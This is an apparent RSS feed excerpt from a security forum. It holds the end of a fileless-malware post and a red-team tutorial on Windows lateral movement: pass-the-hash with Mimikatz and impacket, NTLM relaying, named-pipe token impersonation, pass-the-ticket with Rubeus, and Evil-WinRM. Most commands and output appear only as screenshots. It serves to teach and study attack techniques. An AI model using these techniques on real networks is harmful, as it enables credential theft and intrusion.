<p>And lastly we also have hardware as a method of fileless malware a great demonstration for this would be the infamous Rubber Ducky and malicious USB that impersonates a Keyboard and interacts with the Computer if it were a user typing these commands no file touches disk and commands can be executed directly on a Command or Scripting Interpreter, such as CMD or PowerShell.</p>
<p>Demo:</p>
<p><a href="https://www.youtube.com/watch?v=RO7qcNPAyfY"> - YouTube</a></p>

<p>References:</p>
<aside class="onebox allowlistedgeneric" data-onebox-src="https://www.cybereason.com/blog/fileless-malware">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/2/4/24fd710e91be3121be7e8396f0d8cd5b5b04ab55.png" class="site-icon" data-dominant-color="919090" width="48" height="48">

      <a href="https://www.cybereason.com/blog/fileless-malware" target="_blank" rel="noopener nofollow ugc">cybereason.com</a>
  </header>

  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/263;"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/d/2/d203c935b812e92f1d3465dda8c938a5189cb434_2_690x263.png" class="thumbnail" data-dominant-color="0F408A" width="690" height="263" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/d/2/d203c935b812e92f1d3465dda8c938a5189cb434_2_690x263.png, https://0x00sec.s3.amazonaws.com/original/3X/d/2/d203c935b812e92f1d3465dda8c938a5189cb434.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/d/2/d203c935b812e92f1d3465dda8c938a5189cb434.png 2x"></div>

<h3><a href="https://www.cybereason.com/blog/fileless-malware" target="_blank" rel="noopener nofollow ugc">Fileless Malware 101: Understanding Non-Malware Attacks</a></h3>

  <p>Fileless malware abuses legitimate tools to carry out attacks. Read about fileless malware with examples from real world attacks.</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p><a href="https://us.norton.com/internetsecurity-malware-what-is-fileless-malware..html" class="onebox" target="_blank" rel="noopener nofollow ugc">https://us.norton.com/internetsecurity-malware-what-is-fileless-malware..html</a></p>
<aside class="onebox allowlistedgeneric" data-onebox-src="https://www.crowdstrike.com/cybersecurity-101/malware/fileless-malware/">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/0/6/06de729097562b94a75364c3fe0493f42a6122ee.png" class="site-icon" data-dominant-color="EB3725" width="96" height="96">

      <a href="https://www.crowdstrike.com/cybersecurity-101/malware/fileless-malware/" target="_blank" rel="noopener nofollow ugc">crowdstrike.com</a>
  </header>

  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:421/260;"><img src="https://0x00sec.s3.amazonaws.com/original/3X/7/9/7915bfd10007ee07b66595eb975d512df73d574e.jpeg" class="thumbnail" data-dominant-color="2E2222" width="421" height="260"></div>

<h3><a href="https://www.crowdstrike.com/cybersecurity-101/malware/fileless-malware/" target="_blank" rel="noopener nofollow ugc">What is Fileless Malware? - CrowdStrike</a></h3>

  <p>Fileless malware is a type of malicious software that uses native, legitimate tools built on a system to execute a cyberattack without code.</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric" data-onebox-src="https://www.arista.com/en/solutions/security">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/5/6/563e1a34d7e11e97d744743fa0e495ca64593786.png" class="site-icon" data-dominant-color="003468" width="32" height="32">

      <a href="https://www.arista.com/en/solutions/security" target="_blank" rel="noopener nofollow ugc" title="05:33PM - 03 May 2023">Arista Networks – 3 May 23</a>
  </header>

  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:543/305;"><img src="https://0x00sec.s3.amazonaws.com/original/3X/0/1/01872933c29649f9e047c63e2ac7b45675b21d7c.jpeg" class="thumbnail" data-dominant-color="364D6C" width="543" height="305"></div>

<h3><a href="https://www.arista.com/en/solutions/security" target="_blank" rel="noopener nofollow ugc">Security</a></h3>

  <p>Arista Cloud Network Data Security tools provide next-generation network firewalls featuring visibility and cybersecurity monitoring powered by Arista Networks CloudVision®</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric" data-onebox-src="https://www.varonis.com/blog/fileless-malware">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/3/3/334e35be1813c64adbb253b6aad9bdc40d92aff8.png" class="site-icon" data-dominant-color="D03C4B" width="46" height="46">

      <a href="https://www.varonis.com/blog/fileless-malware" target="_blank" rel="noopener nofollow ugc">varonis.com</a>
  </header>

  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:689/230;"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/d/9/d932d25e2ae25a469d7e01be0253e490cef51f1b_2_689x230.png" class="thumbnail" data-dominant-color="373749" width="689" height="230" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/d/9/d932d25e2ae25a469d7e01be0253e490cef51f1b_2_689x230.png, https://0x00sec.s3.amazonaws.com/optimized/3X/d/9/d932d25e2ae25a469d7e01be0253e490cef51f1b_2_1033x345.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/d/9/d932d25e2ae25a469d7e01be0253e490cef51f1b.png 2x"></div>

<h3><a href="https://www.varonis.com/blog/fileless-malware" target="_blank" rel="noopener nofollow ugc">What is Fileless Malware? PowerShell Exploited</a></h3>

  <p>Fileless malware uses PowerShell to steal valuable data and inject malicious code into your systems. In this guide, we’ll show you how to protect yourself.</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric" data-onebox-src="https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/security-101-how-fileless-attacks-work-and-persist-in-systems">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/b/4/b43c5f3137138de016eb1924df1efbc8c7ec73c2.png" class="site-icon" data-dominant-color="F15258" width="16" height="16">

      <a href="https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/security-101-how-fileless-attacks-work-and-persist-in-systems" target="_blank" rel="noopener nofollow ugc">trendmicro.com</a>
  </header>

  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/499;"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/2/7/27988c9e922540607abbb53f1a4cf51b08f5ad93_2_690x499.jpeg" class="thumbnail" data-dominant-color="A9C6B4" width="690" height="499" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/2/7/27988c9e922540607abbb53f1a4cf51b08f5ad93_2_690x499.jpeg, https://0x00sec.s3.amazonaws.com/original/3X/2/7/27988c9e922540607abbb53f1a4cf51b08f5ad93.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/2/7/27988c9e922540607abbb53f1a4cf51b08f5ad93.jpeg 2x"></div>

<h3><a href="https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/security-101-how-fileless-attacks-work-and-persist-in-systems" target="_blank" rel="noopener nofollow ugc">Security 101: How Fileless Attacks Work and Persist in Systems - Security News</a></h3>

  <p>Many attackers are switching from file-based malware to memory-based attacks to improve their stealth. “Fileless,” “zero-footprint,” or “living off the land” threats use legitimate applications to carry out malicious activities.</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric" data-onebox-src="https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/fileless-threats?view=o365-worldwide">
  <header class="source">

      <a href="https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/fileless-threats?view=o365-worldwide" target="_blank" rel="noopener nofollow ugc">learn.microsoft.com</a>
  </header>

  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/3X/9/2/9209ecc2f83d9574790ba34c60193540a1967260.png" class="thumbnail onebox-avatar" data-dominant-color="D8D7B5" width="400" height="400">

<h3><a href="https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/fileless-threats?view=o365-worldwide" target="_blank" rel="noopener nofollow ugc">Fileless threats</a></h3>

  <p>Learn about the categories of fileless threats and malware that live off the land</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p>Python in WSH</p>
<p><a href="https://help.objectiflune.com/en/knowledgebase/KB/HWT/PPW/KB1504.html" class="onebox" target="_blank" rel="noopener nofollow ugc">https://help.objectiflune.com/en/knowledgebase/KB/HWT/PPW/KB1504.html</a></p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/fileless-malware/26973">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/fileless-malware/26973</link>
          <pubDate>Mon, 30 Aug 2021 14:44:04 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-26973</guid>
          <source url="https://0x00sec.org/t/fileless-malware/26973.rss">Fileless Malware</source>
        </item>
        <item>
          <title>Playing with Hashes and Tickets</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <h1>
<a name="playing-with-hashes-and-tickets-1" class="anchor" href="https://0x00sec.org#playing-with-hashes-and-tickets-1"></a>Playing with Hashes and Tickets</h1>
<p>In a current event I came across an environment where cracking hashes or tickets was not required, or basically impossible, so I started doing my research to keep track on what can we do, when we only have Hashes or Tickets in our possession some are limited to what can be done, but others are more free on what we can achieve so I will work on examples for Windows and Linux Environments.</p>
<p><strong>1.- PtH (Pass the Hash)</strong></p>
<p>Pass the Hash is a credential theft and lateral movement technique in which an attacker can abuse the challenge-and-response nature of NTLM authentication protocol to authenticate as a user with only the NTLM hash of the user’s password. The attacker is thus able to use the compromised account without ever brute-forcing or obtaining the plaintext password.</p>
<p><em><strong>Administrator Privileges are required on the compromised workstation</strong></em></p>
<p>Mimiktaz:</p>
<p>Mimikatz is fairly easy to use this will require us to have already obtain Administrator Privileges (or SYSTEM) to dump the hashes and pass them to start using the accounts privileges over the environment.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/f/9/f9dd8d76353e5727342ce7d2034c6522d5adec59.png" alt="" data-base62-sha1="zEpyZqcr51oBGH4CZ72UGUmkIL7" width="624" height="254"></p>
<p>My focus will be with John as this is an Administrator account on a Remote Workstation</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/a/4aea4b6beca8a2cabdc45f08cb4123aac27d1d5f.png" data-download-href="/uploads/short-url/aGJj102XRfCkmUqtqRDuI7CNzwr.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/4/a/4aea4b6beca8a2cabdc45f08cb4123aac27d1d5f_2_618x500.png" alt="" data-base62-sha1="aGJj102XRfCkmUqtqRDuI7CNzwr" width="618" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/4/a/4aea4b6beca8a2cabdc45f08cb4123aac27d1d5f_2_618x500.png, https://0x00sec.s3.amazonaws.com/original/3X/4/a/4aea4b6beca8a2cabdc45f08cb4123aac27d1d5f.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/4/a/4aea4b6beca8a2cabdc45f08cb4123aac27d1d5f.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/4/a/4aea4b6beca8a2cabdc45f08cb4123aac27d1d5f_2_10x10.png"></a></div><p></p>
<p>Now if I try to list the C directory of the remote workstation I get what was expected an Access Denied.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/b/7/b77fcf3fc6b9be2bbf38dcc055b8c1f83a59dd10.png" alt="" data-base62-sha1="qbjcSSQaLNDzqTvWJrgsNAuBedW" width="432" height="141"></p>
<p>Now we will pass the hash with mimikatz</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/7/9/797b139aa5ea79b517a6c9eb3e0481e13a047dd1.png" alt="" data-base62-sha1="hkFsMGmfzgR7pq9X04WPGjiVGxP" width="624" height="350"></p>
<p>A new CMD window will prompt and we can check our access to the Remote Workstation</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/7/474445acf398d4f1a9315986a50da013fb73e1db.png" alt="" data-base62-sha1="aasaIruQ7QJ8u2GFy5oQb3YUMjx" width="624" height="347"></p>
<p>Mimikatz is great but now let’s give it a try with Linux</p>
<p>Psexec.py from the impacket toolkit is a python version of PsExec for Linux (there are also a variety of tools that achieve the same result but using different methods <em><strong>wmiexec, smbexec.</strong></em> By using these methods the tools will elevate to a SYSTEM shell because of the way they function (Create a Service and these typically run with High Privileges “SYSTEM”)</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/9/a/9adbfc9305278b169ad449216197769b2b12ef6f.png" alt="" data-base62-sha1="m5WQFSIT5BNt7O2XLa5NzUseCKz" width="624" height="292"></p>
<p><strong>2.- SharpNamedPipePTH</strong></p>
<p>(This technique can also be in par with Tokens)</p>
<p>A tool used for authentication via a named pipe for user impersonation. It is based on the Sharp-SMBExec tool, the tool will create a pipe, and pass the hash of the user you are trying to impersonate for authentication this is a great method to execute a binary and use your favorite method to steal or impersonate the token with your favorite C2, in this example I approach it using Cobalt Strike</p>
<p>We will add the username – hash – and binary we are trying to execute and if successful our binary will execute with the token we are trying to impersonate, from here we can inject, steal or any way you would like to approach this situation in my preference I injected a beacon to the process.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/8/8/88a82bf095cc3014e9a017b98ddfc3616a5b7dad.png" alt="" data-base62-sha1="juVf0t6twVO8gZRZGRv58Zz7dHT" width="624" height="206"></p>
<p>Injected:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/c/a/ca838f63dcebe4dccd2ea359a5f44eeb5070b25f.png" alt="" data-base62-sha1="sTwjxWFlBtaobPCo0TqPUulcbLx" width="624" height="58"></p>
<p>But there is a limitation, which I understand why the author mentioned in using the tool when a certain user has only access to certain resources that no one else can, but the limitation is that this technique does not allow network authentication, this is still a great technique just be aware of the limitations.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/0/6/06ad93aeb9112bdb53fcdbc45384a17510878ff8.png" alt="" data-base62-sha1="X4KB5l1NLDJsacpuJtC5Lc3z5K" width="465" height="102"></p>
<p><strong>3.- CrackMapExec</strong></p>
<p>A swiss army for pentesting networks, authored by byt3bl33d3r and built using Python, Powershell, and other languages it is meant to be the swiss knife for Networking it is an amazing to compromise AD, capture hashes, pth, execute code, enumeration and more. It’s usage is straight forward when passing the hash.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/5/d58d3c93f7d8fe5950d5d96ee8c0aea85d51b39e.png" alt="" data-base62-sha1="utaiyuAAh62o6mViZ9nX17gqayG" width="624" height="92"></p>
<p>Here pwned just tells us that the user is a local Administrator on the Workstation it also contains a great feature to Locally Authenticate to the workstation with no parameters CrackMapExec will find the Domain Name and use that for authentication but if we add “–local-auth” we will authenticate locally assuming the user only is a local account and not a domain account.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/7/9/79db0ccda090790d690995478336b03f7db0c74a.png" alt="" data-base62-sha1="hnZ5manKjwQyLXz912fSc0dRM5I" width="624" height="50"></p>
<p>You can tell the Domain switched to the workstations name and tried to authenticate as a local user, this is something to be aware off as sometimes we have compromised a user but not a Domain User.</p>
<p><strong>4.- Over-Pass-the-Hash</strong></p>
<p>Over Pass the hash is an attack that allows an intruder to authenticate as a user without having access to the user’s password. This is a technique where an attacker uses the NTLM hashes for authentication and bypass the standard authentication step clear text password for login. This technique is a combination of passing the hash and passing the ticket, so it’s called Over Pass the Hash. Allows the creating of Kerberos tickets from NTLM hashes or AES keys that allows access to the resource service that required Kerberos authentication.</p>
<p>I could not duplicate the technique as it seems I am not gaining the same keys that are show in the example.</p>
<p>Example:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/c/4/c48e17301ca672c2fe6da9d8b89ba41cf9348dd4.png" alt="" data-base62-sha1="s2O0JCguBDWLEDo8pLB7mCvRZ9G" width="480" height="415"></p>
<p>Mine:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/3/7/3786f81c389b021d2963b1996651c91f7713e949.png" alt="" data-base62-sha1="7VdqINSwNv9TkJ48m2MCbx5VDHr" width="624" height="382"></p>
<p>Please just look at the references below</p>
<p><strong>5.- NTLM Relaying</strong></p>
<p>In this section we will be working with the technique NTLM Relaying, this will replay the NTLM hash to another workstation and execute code, if the user has administrator privileges or permission that allow WRITE access to an SMB Share, also signing has to be disabled you can test this with crackmapexec tool and view the permissions as show below:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/a/8/a8d28fa77d919887138bb222616b0365aef40f09.png" alt="" data-base62-sha1="o5tl5NncM3CC38fTDBlBf4KL5nX" width="624" height="181"></p>
<p>So jwinchester has the proper permissions on to the targeted workstation so with this we can use the ntlmrelay technique to upload and execute a beacon. As we are aware John is an Administrator on the ECHO Workstation we can target this machine with ntlmrelay with the “-t” parameter, but I will demonstrate Code Execution and a binary to be execute on the Target workstation we will also remember to enable smb2support as this will not work with today’s network since SMBv1 is pretty old:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/c/9/c904131fb53481e90c6a2f30724f1d3221ae61b9.png" alt="" data-base62-sha1="sGgHuPPTiGS4PIMJkhCC5TKaAlz" width="518" height="123"></p>
<p>Now we wait for the user to try and access our target machine which we can use other methods such as Tainted Shares, ShortCut Links, or any other methods that you are familiar with to capture the Net-NTLM hash. In the following example I just forced it with the user by trying to list a fake share:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/1/f/1f156566b22f6ab2c325ab8ab8844c9129f0ef9f.png" alt="" data-base62-sha1="4qYDPOQAGvdNDbwxo0fXsCx6O51" width="349" height="84"></p>
<p>When this happens the user sends the NTLM hash and we relay it to another box where the user is a Local Administrator, with this we get Code Execution.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/c/b/cb3b16782fa6fdfd2c7949fa5050a3825ad9a5f1.png" alt="" data-base62-sha1="sZRwkwjjvXVzK2xBFmzGmN8QPN7" width="624" height="388"></p>
<p>What about a beacon that we hold on our attack box? Will use the “-e” parameter to use this:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/8/9/89ec54e941e58307e41dc70ee5ac6a28acf14c91.png" alt="" data-base62-sha1="jG7KBJ18rIuf3yf5Bfh2Fqy3jtT" width="624" height="328"></p>
<p>We now have a beacon with SYSTEM privileges on the workstation:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/3/d/3deb69776e87812b2f7d003b1916bacad6c78700.png" alt="" data-base62-sha1="8PLuB9kjCtTei4TG4ssWzMoWdP2" width="624" height="65"></p>
<p><strong>6.- PipeServerImpersonate.PS1</strong></p>
<p><em><strong>Administrator Privileges</strong></em></p>
<p>Named pipes are nothing new, its an old technology you will find in many operating systems (Unix, Windows,…) to permit asynchronous or synchronous inter-process communication (IPC) on the same computer or on different computers across the network, named pipes are a method for I/O that is great for also executing code to other workstations, Psexec being an example of it.</p>
<p>You can view these easily yourself using PowerShell or pipelist from SysInternals, now let’s try the PowerShell script.</p>
<p>We can see below that by utilizing the script and connecting to the Pipe , we can connect to it directly via CMD just by echoing anything to it.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/5/65b857725c20e21415b0536b132649f0862a86ab.png" alt="" data-base62-sha1="evRaOXC9wsbqwTIv0hjkD3JV6hd" width="582" height="324"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/8/8/887b80218a28c53a65d40a632e018bd5abf91581.png" alt="" data-base62-sha1="jtnx91S6EmhfWrzzGdzNeVccy77" width="515" height="174"></p>
<p>Now we go back to our host where we see the new notepad process executing but with jwinchesters token.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/a/1/a107356db1893862eb4704a83b68cc73008d3fe5.png" alt="" data-base62-sha1="mYwjFMCOKpcV9CBETZgvuGYHdPL" width="624" height="22"></p>
<p>Now we can inject a beacon to this process and impersonate the user, but this also comes with limitations no Network Access, so be wary of this not being an option to Lateral Move more to access local resources specifically for a user.</p>
<p><strong>7.- Pass the Ticket</strong></p>
<p>In pass the tickets attacks, an attacker is able to extract a Kerberos Ticket Granting Ticket (TGT) from LSASS memory on a system and then use this on another system to request Kerberos service tickets (TGS) to gain access to a network resource.</p>
<p>One primary difference between pass-the-hash and pass-the-ticket, is that Kerberos TGT tickets expire (10 hours by default) whereas NTLM hashes only change when the user changes their password. So a TGT ticket must be used within its lifetime, or it can be renewed for a longer period of time (7 days).</p>
<p>Tools like mimikatz can perform this attack. First let us confirm that we receive an access denied with our current user</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/3/639ed3def9e4cc37b7d019d9dc38989367f7e926.png" alt="" data-base62-sha1="edhytY2RID1p7ZJrvz4VdkRljNk" width="450" height="173"></p>
<p>Now with Rubeus we can monitor the Network for tickets, we can force a ticket into our current session by authenticating with the user we are trying to compromise (Just a Demo, there might be other methods to achieve this in an active Network). I focused on this target since the user has CIFS privilege’s over Desktop-Delta.</p>
<p>Some other methods to capture the tickets is if you have the credentials and try to start an Interactive Logon-Session</p>
<p>Local Login: Physically Logging in at Your Workstation</p>
<p><em><strong>runas: Perhaps you are a Low Level Helpdesk who uses /runas to spawn a CMD with DA Account, this will result in a TGT for the DA account be cached in LSSAS</strong></em></p>
<p><em><strong>runas /netonly: TGT will appear after running a network command (</strong></em> <a href="https://IP/SYSVOL" rel="noopener nofollow ugc"> <em><strong>\IP\SYSVOL</strong></em> </a> <em><strong>) or something</strong></em></p>
<p><em><strong>PsExec</strong></em> <a href="https://server" rel="noopener nofollow ugc"> <em><strong>\server</strong></em> </a> <em><strong>-u user -p pwd cmd – PSExec leaves a TGT providing explicit credentials were defined</strong></em></p>
<p><em><strong>Remote Desktop (RDP)</strong></em></p>
<p>By placing Rubeus in Monitor Mode we can capture the tickets</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/b/5/b54cdc77cf82f3c7d7f0053ddb6431c31444709e.png" alt="" data-base62-sha1="pRR5Z1jS1L4dymhFPBa6utpWsTY" width="624" height="432"></p>
<p>From here passing the ticket is simple with Rubeus</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/0/d01908f3e834896cdf11f735ae2297f452b934d9.png" alt="" data-base62-sha1="tGUWXLMtUb0QwYiUeGif04EbTEB" width="624" height="496"></p>
<p>Now let us verify and try our access to the targeted workstation</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/c/2c083cfdd1d51eec6b6542e222c2165b034814c8.png" alt="" data-base62-sha1="6hwERryM7V17cDzF4GOz1Qtsrhe" width="624" height="403"></p>
<p>8.- Evil-WinRM</p>
<p>Another method when holding hashes is to use the PSRemote functionality this allows us to execute code onto a workstation if we have the proper privileges which are usually Administrator when executing remote actions or a sort of special privileges that only a certain user contains.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/0/40903db763b5929dbe8bd3351acfedcdd300520b.png" data-download-href="/uploads/short-url/9d9AMfjFRFWboA39Stj5C854MWf.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/4/0/40903db763b5929dbe8bd3351acfedcdd300520b_2_690x234.png" alt="" data-base62-sha1="9d9AMfjFRFWboA39Stj5C854MWf" width="690" height="234" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/4/0/40903db763b5929dbe8bd3351acfedcdd300520b_2_690x234.png, https://0x00sec.s3.amazonaws.com/original/3X/4/0/40903db763b5929dbe8bd3351acfedcdd300520b.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/4/0/40903db763b5929dbe8bd3351acfedcdd300520b.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/4/0/40903db763b5929dbe8bd3351acfedcdd300520b_2_10x10.png"></a></div><p></p>
<p>References:</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/a/a/aa543283a503e8319f2824577104712253727dc7.png" class="site-icon" width="192" height="192">
      <a href="https://stealthbits.com/blog/how-to-detect-overpass-the-hash-attacks/" target="_blank" rel="noopener nofollow ugc" title="07:16PM - 26 February 2019">Stealthbits Technologies – 26 Feb 19</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:240/262;"><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/5/654d5baad1352b58212294c54a4fd33f2985f33d.png" class="thumbnail" width="240" height="262"></div>

<h3><a href="https://stealthbits.com/blog/how-to-detect-overpass-the-hash-attacks/" target="_blank" rel="noopener nofollow ugc">How to Detect Overpass-the-Hash Attacks</a></h3>

<p>This post takes a look at Overpass-The-Hash attack. This is a combination of both Pass-The-Hash &amp; Pass-The-Ticket attacks. Click in to see how it works.</p>

  <p><span class="label1">Est. reading time: 6 minutes</span>
    </p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/c/0/c049447817e592a1187ff438934c9a3e4570dd19.png" class="site-icon" width="32" height="32">
      <a href="https://attack.stealthbits.com/pass-the-hash-attack-explained" target="_blank" rel="noopener nofollow ugc" title="06:28PM - 09 September 2020">Attack Catalog – 9 Sep 20</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:100/56;"><img src="https://0x00sec.s3.amazonaws.com/original/3X/3/0/30473d7f8d6e345bd4d3c2120304ae3a4d5317fa.jpeg" class="thumbnail" width="100" height="56"></div>

<h3><a href="https://attack.stealthbits.com/pass-the-hash-attack-explained" target="_blank" rel="noopener nofollow ugc">Pass the Hash Attack Tutorial | Lateral Movement using LanMan or NTLM hashes</a></h3>

<p>Pass the Hash is a technique that enables an attacker (typically using Mimikatz) to leverage the LanMan or NTLM hashes of a user’s password. Click in for more!</p>

  <p><span class="label1">Est. reading time: 7 minutes</span>
    </p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p><a href="https://book.hacktricks.xyz/windows/ntlm" class="onebox" target="_blank" rel="noopener nofollow ugc">https://book.hacktricks.xyz/windows/ntlm</a></p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://s1.wp.com/i/favicon.ico" class="site-icon" width="32" height="32">
      <a href="https://decoder.cloud/2019/03/06/windows-named-pipes-impersonation/" target="_blank" rel="noopener nofollow ugc" title="02:16PM - 06 March 2019">Decoder's Blog – 6 Mar 19</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:440/183;"><img src="https://decoderblogblog.files.wordpress.com/2019/03/pipe1.jpg?fit=440%2C330" class="thumbnail" width="440" height="183"></div>

<h3><a href="https://decoder.cloud/2019/03/06/windows-named-pipes-impersonation/" target="_blank" rel="noopener nofollow ugc">Windows Named Pipes &amp; Impersonation</a></h3>

<p>&nbsp; Named pipes are nothing new,&nbsp; it’s a an old technology you will find in many operating systems (Unix, Windows,…) to permit asynchronous or synchronous inter-process communication…</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/2/5/25be82a3d49223d7932fc699fa5226a1482efc57.png" class="site-icon" width="192" height="192">
      <a href="https://en.hackndo.com/ntlm-relay/" target="_blank" rel="noopener nofollow ugc" title="10:11AM - 01 April 2020">hackndo – 1 Apr 20</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/187;"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/f/6/f630aa66b5ce8fabf42109ed72b97df57b9e8633_2_690x187.png" class="thumbnail" width="690" height="187" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/f/6/f630aa66b5ce8fabf42109ed72b97df57b9e8633_2_690x187.png, https://0x00sec.s3.amazonaws.com/optimized/3X/f/6/f630aa66b5ce8fabf42109ed72b97df57b9e8633_2_1035x280.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/f/6/f630aa66b5ce8fabf42109ed72b97df57b9e8633.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/f/6/f630aa66b5ce8fabf42109ed72b97df57b9e8633_2_10x10.png"></div>

<h3><a href="https://en.hackndo.com/ntlm-relay/" target="_blank" rel="noopener nofollow ugc">NTLM Relay</a></h3>

<p>NTLM relay is a technique of standing between a client and a server to perform actions on the server while impersonating the client. Protections such as SMB signing or MIC allow to limit the actions of an attacker. This article goes into detail about...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/a/a/aa543283a503e8319f2824577104712253727dc7.png" class="site-icon" width="192" height="192">
      <a href="https://stealthbits.com/blog/how-to-detect-pass-the-ticket-attacks/" target="_blank" rel="noopener nofollow ugc" title="08:33PM - 19 February 2019">Stealthbits Technologies – 19 Feb 19</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:240/262;"><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/5/654d5baad1352b58212294c54a4fd33f2985f33d.png" class="thumbnail" width="240" height="262"></div>

